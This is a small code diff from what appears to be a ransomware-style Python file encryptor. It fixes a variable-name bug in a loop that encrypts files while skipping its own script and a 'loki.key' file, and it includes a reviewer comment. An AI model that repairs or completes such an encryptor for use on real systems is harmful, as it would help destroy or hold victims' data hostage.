@@ -51,14 +51,14 @@ def encrypt(files):
     # encrypt files
     for path in files:
         # Skip self
-        if '.py' in filePath:
+        if '.py' in path:
             continue
         # Skip key
-        if 'loki.key' in filePath:
+        if 'loki.key' in path:
             continue
 
         # Handle File
-        handleFile(filePath, key, "e")
+        handleFile(path, key, "e")
         # NOTE (mart): Why handle actions when "e" is hardcoded?
         #              Maybe un-hardcode it, and just assume encrypting,
         #              or move it to a seperate file to handle both.
